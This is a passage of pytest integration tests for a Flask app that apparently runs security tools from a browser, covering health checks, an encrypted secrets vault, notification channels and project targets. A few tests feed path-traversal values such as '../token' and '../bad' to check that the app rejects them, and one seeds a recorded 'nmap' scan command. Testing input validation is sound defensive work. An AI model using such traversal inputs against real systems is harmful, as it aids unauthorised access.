"""
Integration tests for Flask routes using the test client.
These tests exercise HTTP-level behaviour without starting a real server.
Run with: pytest tests/ (from the repo root)
"""

import errno
import base64
import csv
import hashlib
import io
import json
import logging
import os
import re
import sqlite3
import tempfile
import time
import uuid
import zipfile

import pytest
from datetime import datetime, timedelta, timezone
from pathlib import Path
from urllib.parse import quote, urlencode
import unittest.mock as mock

import app as shell_app
import blueprints.assets as shell_assets
import blueprints.history as history_routes
import blueprints.projects as project_routes
import config
import services.runs.comparison as run_comparison
import services.secrets.vault as secrets_vault
from services.commands.builtins import execute_builtin_command
from core.database import DB_PATH, db_connect, db_init
from core.database_backend import quote_sqlite_identifier
from services.projects.findings import record_run_findings
from services.atlas.materializer import materialize_run_entities
from services.workspace.files import resolve_workspace_path


# ── Fixtures ──────────────────────────────────────────────────────────────────

def get_client(*, use_forwarded_for=True):
    shell_app.app.config["TESTING"] = True
    client = shell_app.app.test_client()
    if use_forwarded_for:
        client.environ_base["HTTP_X_FORWARDED_FOR"] = f"203.0.113.{uuid.uuid4().int % 250 + 1}"
    return client


class _RouteFakeProc:
    def __init__(self, pid=4321):
        self.pid = pid
        self.stdout = mock.Mock()


class _CapturedThread:
    instances = []

    def __init__(self, *, target=None, kwargs=None, name="", daemon=None):
        self.target = target
        self.kwargs = kwargs or {}
        self.name = name
        self.daemon = daemon
        self.started = False
        self.__class__.instances.append(self)

    def start(self):
        self.started = True


# ── / ─────────────────────────────────────────────────────────────────────────

class TestIndexRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/")
        assert resp.status_code == 200

    def test_returns_html(self):
        client = get_client()
        resp = client.get("/")
        assert b"<!DOCTYPE html>" in resp.data or b"<html" in resp.data.lower()

    def test_desktop_diag_link_opens_in_new_tab_while_mobile_action_stays_button(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["203.0.113.0/24"]}):
            body = client.get("/").get_data(as_text=True)
        assert 'id="rail-diag-btn"' in body
        assert 'href="/diag"' in body
        assert 'target="_blank"' in body
        assert 'rel="noopener noreferrer"' in body
        assert 'data-menu-action="diag"' in body
        rail_match = re.search(r'<a class="([^"]*)" data-action="diag" id="rail-diag-btn"', body)
        mobile_match = re.search(r'<button type="button" class="([^"]*)" data-menu-action="diag"', body)
        assert rail_match and "u-hidden" not in rail_match.group(1)
        assert mobile_match and "u-hidden" not in mobile_match.group(1)

    def test_bootstrapped_app_config_matches_config_route(self):
        client = get_client(use_forwarded_for=False)
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            body = client.get("/").get_data(as_text=True)
            config_payload = json.loads(client.get("/config").data)
        match = re.search(
            r'<script id="app-config-json" type="application/json">(.*?)</script>',
            body,
            re.S,
        )
        assert match
        boot_payload = json.loads(match.group(1))
        assert boot_payload == config_payload

# ── /health ───────────────────────────────────────────────────────────────────

class TestHealthRoute:
    def test_returns_200_when_db_ok(self):
        client = get_client()
        resp = client.get("/health")
        assert resp.status_code == 200

    def test_response_is_json(self):
        client = get_client()
        resp = client.get("/health")
        data = json.loads(resp.data)
        assert "status" in data
        assert "db" in data
        assert "redis" in data

    def test_db_true_when_sqlite_available(self):
        client = get_client()
        resp = client.get("/health")
        data = json.loads(resp.data)
        assert data["db"] is True

    def test_redis_null_when_no_redis(self):
        # In the test environment there is no Redis configured
        client = get_client()
        resp = client.get("/health")
        data = json.loads(resp.data)
        assert data["redis"] is None

    def test_status_degraded_when_db_fails(self):
        client = get_client()
        with mock.patch("blueprints.assets.db_connect", side_effect=Exception("db error")):
            resp = client.get("/health")
        assert resp.status_code == 503
        data = json.loads(resp.data)
        assert data["status"] == "degraded"
        assert data["db"] is False

    def test_status_ok_when_redis_pings_successfully(self):
        client = get_client()
        fake_redis = mock.MagicMock()
        fake_redis.ping.return_value = True
        with mock.patch("blueprints.assets.redis_client", fake_redis):
            resp = client.get("/health")
        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert data["status"] == "ok"
        assert data["redis"] is True

    def test_status_degraded_when_redis_ping_fails(self):
        client = get_client()
        fake_redis = mock.MagicMock()
        fake_redis.ping.side_effect = Exception("redis down")
        with mock.patch("blueprints.assets.redis_client", fake_redis):
            resp = client.get("/health")
        assert resp.status_code == 503
        data = json.loads(resp.data)
        assert data["status"] == "degraded"
        assert data["redis"] is False


class TestSecretsRoutes:
    def _secret_client(self, monkeypatch, tmp_path):
        key = base64.b64encode(b"b" * 32).decode("ascii")
        monkeypatch.setenv("SECRETS_MASTER_KEY", key)
        monkeypatch.setattr(secrets_vault, "resolve_data_dir", lambda: str(tmp_path))
        secrets_vault.reset_master_key_cache_for_tests()
        db_path = str(tmp_path / "secrets-routes.db")
        lock_path = str(tmp_path / "secrets-routes.lock")
        patchers = [
            mock.patch("core.database.DB_PATH", db_path),
            mock.patch("core.database.DB_INIT_LOCK_PATH", lock_path),
        ]
        for patcher in patchers:
            patcher.start()
        db_init()
        client = get_client()
        return client, patchers

    def test_session_secrets_crud_never_returns_value(self, monkeypatch, tmp_path):
        client, patchers = self._secret_client(monkeypatch, tmp_path)
        try:
            headers = {"X-Session-ID": "secrets-route-session"}
            create = client.post(
                "/session/secrets",
                headers=headers,
                json={
                    "name": "shodan_api_key",
                    "value": "super-secret",
                    "consumer_envs": ["SHODAN_API_KEY"],
                },
            )
            assert create.status_code == 201
            created_payload = create.get_json()
            assert created_payload["name"] == "SHODAN_API_KEY"
            assert "value" not in created_payload
            assert "super-secret" not in create.get_data(as_text=True)

            update = client.post(
                "/session/secrets",
                headers=headers,
                json={"name": "SHODAN_API_KEY", "value": "replacement"},
            )
            assert update.status_code == 200

            listed = client.get("/session/secrets", headers=headers)
            assert listed.status_code == 200
            listed_payload = listed.get_json()
            assert listed_payload["secrets"][0]["name"] == "SHODAN_API_KEY"
            assert "replacement" not in listed.get_data(as_text=True)

            rotated = client.post("/session/secrets/rotate", headers=headers)
            assert rotated.status_code == 200
            assert rotated.get_json()["rewrapped"] == 1
            assert "replacement" not in rotated.get_data(as_text=True)

            removed = client.delete("/session/secrets/shodan_api_key", headers=headers)
            assert removed.status_code == 200
            assert removed.get_json()["removed"] is True
            assert client.get("/session/secrets", headers=headers).get_json()["secrets"] == []
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_session_secrets_reject_invalid_name(self, monkeypatch, tmp_path):
        client, patchers = self._secret_client(monkeypatch, tmp_path)
        try:
            resp = client.post(
                "/session/secrets",
                headers={"X-Session-ID": "secrets-invalid-name-session"},
                json={"name": "../token", "value": "secret"},
            )
            assert resp.status_code == 400
            assert resp.get_json()["error"] == "invalid_name"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_session_secrets_require_valid_session_id(self, monkeypatch, tmp_path):
        client, patchers = self._secret_client(monkeypatch, tmp_path)
        try:
            listed = client.get("/session/secrets")
            assert listed.status_code == 401
            assert listed.get_json()["error"] == "session_required"

            with mock.patch.dict(shell_app.app.config, {"ALLOW_LEGACY_TEST_SESSION_IDS": False}):
                created = client.post(
                    "/session/secrets",
                    headers={"X-Session-ID": "../bad"},
                    json={"name": "SHODAN_API_KEY", "value": "secret"},
                )
            assert created.status_code == 401
            assert created.get_json()["error"] == "session_required"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_session_secrets_reject_duplicate_consumer_env_binding(self, monkeypatch, tmp_path):
        client, patchers = self._secret_client(monkeypatch, tmp_path)
        try:
            headers = {"X-Session-ID": "secrets-consumer-env-session"}
            first = client.post(
                "/session/secrets",
                headers=headers,
                json={
                    "name": "shodan_primary",
                    "value": "primary-secret",
                    "consumer_envs": ["SHODAN_API_KEY"],
                },
            )
            assert first.status_code == 201

            duplicate = client.post(
                "/session/secrets",
                headers=headers,
                json={
                    "name": "shodan_backup",
                    "value": "backup-secret",
                    "consumer_envs": ["SHODAN_API_KEY"],
                },
            )
            assert duplicate.status_code == 409
            payload = duplicate.get_json()
            assert payload["error"] == "consumer_env_conflict"
            assert payload["env"] == "SHODAN_API_KEY"
            assert payload["existing_name"] == "SHODAN_PRIMARY"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()


class TestNotificationChannelRoutes:
    def _notification_client(self, monkeypatch, tmp_path):
        key = base64.b64encode(b"c" * 32).decode("ascii")
        monkeypatch.setenv("SECRETS_MASTER_KEY", key)
        monkeypatch.setattr(secrets_vault, "resolve_data_dir", lambda: str(tmp_path))
        secrets_vault.reset_master_key_cache_for_tests()
        db_path = str(tmp_path / "notification-routes.db")
        lock_path = str(tmp_path / "notification-routes.lock")
        patchers = [
            mock.patch("core.database.DB_PATH", db_path),
            mock.patch("core.database.DB_INIT_LOCK_PATH", lock_path),
        ]
        for patcher in patchers:
            patcher.start()
        db_init()
        client = get_client()
        return client, patchers

    def _create_webhook_channel(self, client, session_id):
        self._register_session_token(session_id)
        return client.post(
            "/session/notification-channels",
            headers={"X-Session-ID": session_id},
            json={
                "kind": "webhook",
                "label": "Ops webhook",
                "secret_values": {"url": "https://example.invalid/hook"},
                "triggers": ["run_complete"],
            },
        )

    def _register_session_token(self, session_id):
        with db_connect() as conn:
            conn.execute(
                "INSERT OR IGNORE INTO session_tokens (token, created, last_seen_at) VALUES (?, ?, ?)",
                (session_id, datetime.now(timezone.utc).isoformat(), ""),
            )
            conn.commit()

    def test_notification_channels_require_durable_session_tokens(self, monkeypatch, tmp_path):
        client, patchers = self._notification_client(monkeypatch, tmp_path)
        try:
            resp = client.get("/session/notification-channels", headers={"X-Session-ID": "sess-anonymous"})
            assert resp.status_code == 401
            assert resp.get_json()["error"] == "session_token_required"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_notification_channel_crud_masks_secret_values(self, monkeypatch, tmp_path):
        from services.notifications.secrets import channel_secret_name, get_channel_secret

        client, patchers = self._notification_client(monkeypatch, tmp_path)
        try:
            session_id = "tok_notification_routes"
            created = self._create_webhook_channel(client, session_id)
            assert created.status_code == 201
            assert "https://example.invalid/hook" not in created.get_data(as_text=True)
            payload = created.get_json()["channel"]
            assert payload["kind"] == "webhook"
            assert payload["label"] == "Ops webhook"
            assert payload["triggers"] == ["run_complete"]
            assert payload["secret_fields"] == [{"name": "url", "configured": True}]
            secret_name = channel_secret_name(payload["id"], "url")
            assert get_channel_secret(session_id, secret_name) == "https://example.invalid/hook"

            listed = client.get("/session/notification-channels", headers={"X-Session-ID": session_id})
            assert listed.status_code == 200
            assert "https://example.invalid/hook" not in listed.get_data(as_text=True)
            assert listed.get_json()["channels"][0]["id"] == payload["id"]

            kind_change = client.patch(
                f"/session/notification-channels/{payload['id']}",
                headers={"X-Session-ID": session_id},
                json={
                    "kind": "telegram",
                    "label": "Wrong type",
                    "config": {"chat_id": "-100123"},
                    "secret_values": {"bot_token": "secret-token"},
                    "triggers": ["watcher_error"],
                },
            )
            assert kind_change.status_code == 400
            assert kind_change.get_json()["error"] == "kind_locked"
            assert get_channel_secret(session_id, secret_name) == "https://example.invalid/hook"

            updated = client.patch(
                f"/session/notification-channels/{payload['id']}",
                headers={"X-Session-ID": session_id},
                json={
                    "kind": "webhook",
                    "label": "Muted webhook",
                    "config": {"timeout_seconds": "5"},
                    "triggers": ["watcher_error"],
                    "muted": True,
                },
            )
            assert updated.status_code == 200
            updated_payload = updated.get_json()["channel"]
            assert updated_payload["label"] == "Muted webhook"
            assert updated_payload["config"] == {"timeout_seconds": "5"}
            assert updated_payload["triggers"] == ["watcher_error"]
            assert updated_payload["muted"] is True
            assert updated_payload["secret_fields"] == [{"name": "url", "configured": True}]
            assert get_channel_secret(session_id, secret_name) == "https://example.invalid/hook"

            secret_replaced = client.patch(
                f"/session/notification-channels/{payload['id']}",
                headers={"X-Session-ID": session_id},
                json={
                    "kind": "webhook",
                    "label": "Replacement webhook",
                    "config": {"timeout_seconds": "6"},
                    "secret_values": {"url": "https://replacement.example.invalid/hook"},
                    "triggers": ["run_complete"],
                    "muted": False,
                },
            )
            assert secret_replaced.status_code == 200
            assert get_channel_secret(session_id, secret_name) == "https://replacement.example.invalid/hook"
            assert "https://replacement.example.invalid/hook" not in secret_replaced.get_data(as_text=True)
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_notification_channel_create_rolls_back_secret_when_row_insert_fails(self, monkeypatch, tmp_path):
        from services.notifications import channels_store
        from services.notifications.secrets import channel_secret_name, get_channel_secret

        _client, patchers = self._notification_client(monkeypatch, tmp_path)
        try:
            session_id = "tok_notification_atomic_secret"
            self._register_session_token(session_id)
            monkeypatch.setattr(channels_store, "_channel_id", lambda: "ntc_atomic_secret")
            created = channels_store.create_notification_channel(
                session_id,
                {
                    "kind": "webhook",
                    "label": "Atomic webhook",
                    "secret_values": {"url": "https://first.example.invalid/hook"},
                    "triggers": ["run_complete"],
                },
            )
            with pytest.raises(Exception):
                channels_store.create_notification_channel(
                    session_id,
                    {
                        "kind": "webhook",
                        "label": "Duplicate webhook",
                        "secret_values": {"url": "https://second.example.invalid/hook"},
                        "triggers": ["run_complete"],
                    },
                )

            assert created["id"] == "ntc_atomic_secret"
            secret_name = channel_secret_name("ntc_atomic_secret", "url")
            assert get_channel_secret(session_id, secret_name) == "https://first.example.invalid/hook"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_notification_channel_test_endpoint_dispatches_sync_event(self, monkeypatch, tmp_path):
        from services.notifications.models import ChannelResult

        delivered = []
        client, patchers = self._notification_client(monkeypatch, tmp_path)
        monkeypatch.setitem(config.CFG, "app_name", "darklab_shell")
        monkeypatch.setattr(
            "services.notifications.channels.webhook.post_json",
            lambda url, payload, config, label, **_kwargs: delivered.append((url, payload, label)) or ChannelResult.success(),
        )
        try:
            session_id = "tok_notification_test_send"
            created = self._create_webhook_channel(client, session_id)
            assert created.status_code == 201
            channel_id = created.get_json()["channel"]["id"]

            resp = client.post(
                f"/session/notification-channels/{channel_id}/test",
                headers={"X-Session-ID": session_id},
            )
            assert resp.status_code == 200
            payload = resp.get_json()
            assert payload["queued"] == 1
            assert payload["events"] == [{"event_id": payload["event_ids"][0], "status": "sent", "last_error": ""}]
            assert delivered[0][0] == "https://example.invalid/hook"
            assert delivered[0][1]["trigger"] == "test"
            assert delivered[0][1]["app_name"] == "darklab_shell"
            assert delivered[0][1]["message"] == "darklab_shell test notification"
            with db_connect() as conn:
                row = conn.execute(
                    "SELECT status, attempts FROM notification_events WHERE channel_id = ?",
                    (channel_id,),
                ).fetchone()
            assert dict(row) == {"status": "sent", "attempts": 1}
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_notification_channel_test_endpoint_targets_requested_channel(self, monkeypatch, tmp_path):
        from services.notifications.models import ChannelResult

        delivered = []
        client, patchers = self._notification_client(monkeypatch, tmp_path)
        monkeypatch.setattr(
            "services.notifications.channels.webhook.post_json",
            lambda url, payload, config, label, **_kwargs: delivered.append((url, payload, label)) or ChannelResult.success(),
        )
        try:
            session_id = "tok_notification_test_single"
            first = self._create_webhook_channel(client, session_id).get_json()["channel"]
            second_resp = client.post(
                "/session/notification-channels",
                headers={"X-Session-ID": session_id},
                json={
                    "kind": "webhook",
                    "label": "Second webhook",
                    "secret_values": {"url": "https://second.example.invalid/hook"},
                    "triggers": ["run_complete"],
                },
            )
            second = second_resp.get_json()["channel"]

            resp = client.post(
                f"/session/notification-channels/{second['id']}/test",
                headers={"X-Session-ID": session_id},
            )

            assert resp.status_code == 200
            payload = resp.get_json()
            assert payload["queued"] == 1
            assert payload["events"] == [{"event_id": payload["event_ids"][0], "status": "sent", "last_error": ""}]
            assert delivered == [
                (
                    "https://second.example.invalid/hook",
                    {
                        "trigger": "test",
                        "app_name": "darklab_shell",
                        "channel_id": second["id"],
                        "message": "darklab_shell test notification",
                        "occurred_at": delivered[0][1]["occurred_at"],
                    },
                    "webhook",
                )
            ]
            with db_connect() as conn:
                rows = conn.execute(
                    "SELECT channel_id, status FROM notification_events ORDER BY created"
                ).fetchall()
            assert [(row["channel_id"], row["status"]) for row in rows] == [(second["id"], "sent")]
            assert first["id"] != second["id"]
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_notification_channel_test_endpoint_reports_delivery_failure_status(self, monkeypatch, tmp_path):
        from services.notifications.models import ChannelResult

        client, patchers = self._notification_client(monkeypatch, tmp_path)
        monkeypatch.setattr(
            "services.notifications.channels.webhook.post_json",
            lambda url, payload, config, label, **_kwargs: ChannelResult.retry("webhook rejected the test"),
        )
        try:
            session_id = "tok_notification_test_failure"
            created = self._create_webhook_channel(client, session_id)
            channel_id = created.get_json()["channel"]["id"]

            resp = client.post(
                f"/session/notification-channels/{channel_id}/test",
                headers={"X-Session-ID": session_id},
            )

            payload = resp.get_json()
            assert resp.status_code == 200
            assert payload["queued"] == 1
            assert payload["events"] == [
                {
                    "event_id": payload["event_ids"][0],
                    "status": "retry_wait",
                    "last_error": "webhook rejected the test",
                }
            ]
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_notification_channels_migrate_with_session_token_and_secrets(self, monkeypatch, tmp_path):
        from services.notifications.models import ChannelResult

        delivered = []
        client, patchers = self._notification_client(monkeypatch, tmp_path)
        monkeypatch.setattr(
            "services.notifications.channels.webhook.post_json",
            lambda url, payload, config, label, **_kwargs: delivered.append((url, payload, label)) or ChannelResult.success(),
        )
        try:
            source_session_id = "tok_notification_migrate_source"
            destination_token = "tok_notification_migrate_dest"
            self._register_session_token(source_session_id)
            self._register_session_token(destination_token)
            created = self._create_webhook_channel(client, source_session_id).get_json()["channel"]
            with db_connect() as conn:
                conn.execute(
                    "INSERT INTO notification_events "
                    "(id, session_token, channel_id, trigger, payload_json, status, attempts, "
                    "next_attempt_at, last_attempt_at, last_error, run_id, created, dead_at) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                    (
                        "nte_migrates_with_channel",
                        source_session_id,
                        created["id"],
                        "test",
                        json.dumps({"trigger": "test"}),
                        "pending",
                        0,
                        "",
                        "",
                        "",
                        "",
                        datetime.now(timezone.utc).isoformat(),
                        "",
                    ),
                )
                conn.commit()

            migrate_resp = client.post(
                "/session/migrate",
                headers={"X-Session-ID": source_session_id},
                json={"from_session_id": source_session_id, "to_session_id": destination_token},
            )
            listed = client.get("/session/notification-channels", headers={"X-Session-ID": destination_token})
            test_resp = client.post(
                f"/session/notification-channels/{created['id']}/test",
                headers={"X-Session-ID": destination_token},
            )

            assert migrate_resp.status_code == 200
            assert migrate_resp.get_json()["migrated_notification_channels"] == 1
            assert migrate_resp.get_json()["migrated_notification_events"] == 1
            assert listed.status_code == 200
            assert listed.get_json()["channels"][0]["id"] == created["id"]
            assert test_resp.status_code == 200
            assert delivered[0][0] == "https://example.invalid/hook"
            with db_connect() as conn:
                source_channel_count = conn.execute(
                    "SELECT COUNT(*) AS count FROM notification_channels WHERE session_token = ?",
                    (source_session_id,),
                ).fetchone()["count"]
                migrated_event = conn.execute(
                    "SELECT session_token FROM notification_events WHERE id = ?",
                    ("nte_migrates_with_channel",),
                ).fetchone()
            assert int(source_channel_count) == 0
            assert migrated_event["session_token"] == destination_token
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_notification_channel_delete_removes_channel_and_vault_secrets(self, monkeypatch, tmp_path):
        from services.notifications.secrets import channel_secret_name, get_channel_secret

        client, patchers = self._notification_client(monkeypatch, tmp_path)
        try:
            session_id = "tok_notification_delete"
            self._register_session_token(session_id)
            created = client.post(
                "/session/notification-channels",
                headers={"X-Session-ID": session_id},
                json={
                    "kind": "pushover",
                    "label": "Push alerts",
                    "secret_values": {"app_token": "app-secret", "user_key": "user-secret"},
                    "triggers": ["run_complete"],
                },
            )
            assert created.status_code == 201
            channel_id = created.get_json()["channel"]["id"]
            app_secret_name = channel_secret_name(channel_id, "app_token")
            user_secret_name = channel_secret_name(channel_id, "user_key")
            assert get_channel_secret(session_id, app_secret_name) == "app-secret"
            assert get_channel_secret(session_id, user_secret_name) == "user-secret"

            deleted = client.delete(
                f"/session/notification-channels/{channel_id}",
                headers={"X-Session-ID": session_id},
            )
            assert deleted.status_code == 200
            assert deleted.get_json()["removed"] is True

            listed = client.get("/session/notification-channels", headers={"X-Session-ID": session_id})
            assert listed.status_code == 200
            assert listed.get_json()["channels"] == []
            assert get_channel_secret(session_id, app_secret_name) is None
            assert get_channel_secret(session_id, user_secret_name) is None
        finally:
            for patcher in reversed(patchers):
                patcher.stop()


# ── /projects ────────────────────────────────────────────────────────────────

class TestProjectRoutes:
    def _session_id(self, prefix="projects"):
        return f"{prefix}-" + uuid.uuid4().hex[:8]

    def _create_project(self, client, session_id, name="External Review"):
        resp = client.post(
            "/projects",
            json={"name": name, "description": "Quarterly case folder", "color": "green"},
            headers={"X-Session-ID": session_id},
        )
        assert resp.status_code == 201
        return json.loads(resp.data)["project"]

    def _seed_run(
        self,
        session_id,
        command="nmap darklab.sh",
        *,
        run_id=None,
        run_kind="external",
        owner_tab_id="",
        started="datetime('now')",
    ):
        run_id = run_id or "run-" + uuid.uuid4().hex
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO runs "
                "(id, session_id, run_kind, owner_tab_id, command, started, output_preview, output_line_count) "
                f"VALUES (?, ?, ?, ?, ?, {started}, ?, 0)",
                (run_id, session_id, run_kind, owner_tab_id, command, "[]"),
            )
            conn.commit()
        return run_id

    def _seed_snapshot(self, session_id, label="workspace snapshot", *, snapshot_id=None):
        snapshot_id = snapshot_id or "snap-" + uuid.uuid4().hex
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO snapshots (id, session_id, label, created, content) "
                "VALUES (?, ?, ?, datetime('now'), ?)",
                (snapshot_id, session_id, label, "[]"),
            )
            conn.commit()
        return snapshot_id

    def _link_run(self, client, session_id, project_id, run_id):
        resp = client.post(
            f"/projects/{project_id}/links",
            json={"entity_type": "run", "entity_id": run_id, "source": "manual"},
            headers={"X-Session-ID": session_id},
        )
        assert resp.status_code == 201
        return json.loads(resp.data)["link"]

    def _seed_run_entities(self, session_id, run_id):
        with db_connect() as conn:
            recorded = materialize_run_entities(
                conn,
                session_id,
                run_id,
                [{
                    "text": "darklab.sh 104.21.4.35",
                    "entities": [
                        {"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"},
                        {"type": "ip", "value": "104.21.4.35", "canonical_value": "104.21.4.35"},
                    ],
                }],
                seen_at="2026-05-14T00:00:01+00:00",
            )
            conn.commit()
        return recorded

    def _project_compare_url(self, project_id, *, left=None, right=None, baseline_label=None):
        params = {"project_id": project_id}
        if left is not None:
            params["left"] = left
        if right is not None:
            params["right"] = right
        if baseline_label is not None:
            params["baseline_label"] = baseline_label
        return f"/history/compare?{urlencode(params)}"

    def test_project_host_target_ip_is_stored_as_ip_entity(self):
        client = get_client()
        session_id = self._session_id("project-host-ip")
        project = self._create_project(client, session_id)

        resp = client.post(
            f"/projects/{project['id']}/targets",
            json={"type": "host", "value": "192.0.2.10"},
            headers={"X-Session-ID": session_id},
        )
        target = json.loads(resp.data)["target"]

        assert resp.status_code == 201
        assert target["type"] == "ip"
        assert target["value"] == "192.0.2.10"

    def test_builtin_runs_do_not_record_findings_even_with_legacy_project_link(self):
        client = get_client()
        session_id = self._session_id("builtin-findings")
        project = self._create_project(client, session_id)
        run_id = self._seed_run(session_id, "history", run_kind="builtin")
        target = json.loads(client.post(
            f"/projects/{project['id']}/targets",
            json={"type": "host", "value": "darklab.sh"},
            headers={"X-Session-ID": session_id},
        ).data)["target"]
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
                "VALUES (?, ?, 'run', ?, 'manual', datetime('now'))",
                ("plink_" + uuid.uuid4().hex, project["id"], run_id),
            )
            recorded = record_run_findings(
                conn,
                session_id,
                run_id,
                [{"text": "darklab.sh exposed service", "signals": ["findings"]}],
            )
            finding_count = conn.execute(
                "SELECT COUNT(*) FROM findings WHERE session_id = ? AND run_id = ?",
                (session_id, run_id),
            ).fetchone()[0]
            conn.execute("DELETE FROM project_links WHERE entity_id = ?", (run_id,))
            conn.execute(
                "DELETE FROM project_links WHERE entity_type = 'atlas_entity' AND entity_id = ?",
                (target["id"],),
            )
            conn.execute("DELETE FROM runs WHERE id = ?", (run_id,))
            conn.execute("DELETE FROM projects WHERE id = ?", (project["id"],))
            conn.commit()
        assert recorded == []
        assert finding_count == 0

    def test_project_write_routes_are_rate_limited(self):
        for view in (
            project_routes.projects_create,
            project_routes.projects_active_set,
            project_routes.projects_active_clear,
            project_routes.projects_update,
            project_routes.projects_delete,
            project_routes.projects_links_create,
            project_routes.projects_links_delete,
            project_routes.projects_targets_create,
            project_routes.projects_targets_update,
            project_routes.projects_targets_delete,
            project_routes.projects_packages_create,
            project_routes.projects_packages_delete,
            project_routes.findings_review_update,
            project_routes.entity_labels_create,
            project_routes.entity_labels_delete,
            project_routes.entity_note_update,
            project_routes.entity_note_delete,
        ):
            assert "__wrapper-limiter-instance" in view.__dict__
        assert "__wrapper-limiter-instance" in project_routes.projects_packages_download.__dict__

    def test_create_list_get_update_archive_and_delete_project(self):
        client = get_client()
        session_id = self._session_id()
        project = self._create_project(client, session_id)

        assert project["name"] == "External Review"
        assert project["slug"] == "external-review"
        assert project["status"] == "active"

        listed = json.loads(client.get("/projects", headers={"X-Session-ID": session_id}).data)
        assert [item["id"] for item in listed["projects"]] == [project["id"]]

        get_resp = client.get(f"/projects/{project['id']}", headers={"X-Session-ID": session_id})
        assert json.loads(get_resp.data)["project"]["description"] == "Quarterly case folder"

        project_label = client.post(
            f"/entities/project/{project['id']}/labels",
            json={"label": "important"},
            headers={"X-Session-ID": session_id},
        )
        assert project_label.status_code == 201
        labeled_list = json.loads(client.get("/projects", headers={"X-Session-ID": session_id}).data)
        assert [label["label"] for label in labeled_list["projects"][0]["labels"]] == ["important"]
        paged_list = json.loads(client.get(
            "/projects?include_archived=1&include_counts=1&limit=1&offset=0",
            headers={"X-Session-ID": session_id},
        ).data)
        assert paged_list["total"] == 1
        assert paged_list["limit"] == 1
        assert paged_list["offset"] == 0
        assert paged_list["projects"][0]["counts"]["runs"] == 0
        assert [label["label"] for label in paged_list["projects"][0]["labels"]] == ["important"]
        labeled_get = json.loads(client.get(
            f"/projects/{project['id']}",
            headers={"X-Session-ID": session_id},
        ).data)
        assert [label["label"] for label in labeled_get["project"]["labels"]] == ["important"]
        labeled_summary = json.loads(client.get(
            f"/projects/{project['id']}/summary",
            headers={"X-Session-ID": session_id},
        ).data)
        assert [label["label"] for label in labeled_summary["project"]["labels"]] == ["important"]

        target_resp = client.post(
            f"/projects/{project['id']}/targets",
            json={"type": "domain", "value": "darklab.sh"},
            headers={"X-Session-ID": session_id},
        )
        duplicate_target_resp = client.post(
            f"/projects/{project['id']}/targets",
            json={"type": "domain", "value": "darklab.sh"},
            headers={"X-Session-ID": session_id},
        )
        invalid_target_resp = client.post(
            f"/projects/{project['id']}/targets",
            json={"type": "unsupported", "value": "darklab.sh"},
            headers={"X-Session-ID": session_id},
        )
        assert target_resp.status_code == 201
        assert duplicate_target_resp.status_code == 201
        assert invalid_target_resp.status_code == 400
        target = json.loads(target_resp.data)["target"]
        assert json.loads(duplicate_target_resp.data)["target"]["id"] == target["id"]
        assert target["value"] == "darklab.sh"
        assert target["confidence"] == 1.0
        assert target["review_state"] == "confirmed"
        assert target["source"] == "user"
        assert target["source_detail"] == {}
        assert target["seen_count"] == 1
        assert target["dismissed_at"] == ""

        updated_target = json.loads(client.put(
            f"/projects/{project['id']}/targets/{target['id']}",
            json={"confidence": 0.8},
            headers={"X-Session-ID": session_id},
        ).data)["target"]
        assert updated_target["confidence"] == 0.8
        target_label = client.post(
            f"/entities/target/{target['id']}/labels",
            json={"label": "Primary web domain"},
            headers={"X-Session-ID": session_id},
        )
        target_note = client.put(
            f"/entities/target/{target['id']}/note",
            json={"body": "Scope approved"},
            headers={"X-Session-ID": session_id},
        )
        assert target_label.status_code == 201
        assert target_note.status_code == 200
        targets = json.loads(client.get(
            f"/projects/{project['id']}/targets",
            headers={"X-Session-ID": session_id},
        ).data)
        assert [item["id"] for item in targets["targets"]] == [target["id"]]
        assert [item["label"] for item in targets["targets"][0]["labels"]] == ["Primary web domain"]
        assert targets["targets"][0]["note"]["body"] == "Scope approved"
        fallback_target = json.loads(client.post(
            f"/projects/{project['id']}/targets",
            json={"type": "host", "value": "api.darklab.sh"},
            headers={"X-Session-ID": session_id},
        ).data)["target"]
        with sqlite3.connect(DB_PATH) as conn:
            finding_id = "fnd_target_delete_" + uuid.uuid4().hex
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, target_id, scope, raw_line, created) "
                "VALUES (?, ?, 'run_target_delete', ?, 'finding', 'target finding', datetime('now'))",
                (finding_id, session_id, target["id"]),
            )
            conn.execute(
                "INSERT INTO entity_labels "
                "(id, session_id, entity_type, entity_id, label, created) "
                "VALUES (?, ?, 'finding', ?, 'finding-kept', datetime('now'))",
                ("lbl_finding_target_delete_" + uuid.uuid4().hex, session_id, finding_id),
            )
            conn.commit()
        hidden_targets = client.get(
            f"/projects/{project['id']}/targets",
            headers={"X-Session-ID": "other-session"},
        )
        assert hidden_targets.status_code == 404
        delete_target_resp = client.delete(
            f"/projects/{project['id']}/targets/{target['id']}",
            headers={"X-Session-ID": session_id},
        )
        assert delete_target_resp.status_code == 200
        targets_after_delete = json.loads(client.get(
            f"/projects/{project['id']}/targets",
            headers={"X-Session-ID": session_id},
        ).data)
        assert [item["id"] for item in targets_after_delete["targets"]] == [fallback_target["id"]]
        with sqlite3.connect(DB_PATH) as conn:
            assert conn.execute(
                "SELECT COUNT(*) FROM entity_labels WHERE entity_type = 'atlas_entity' AND entity_id = ?",
                (target["id"],),
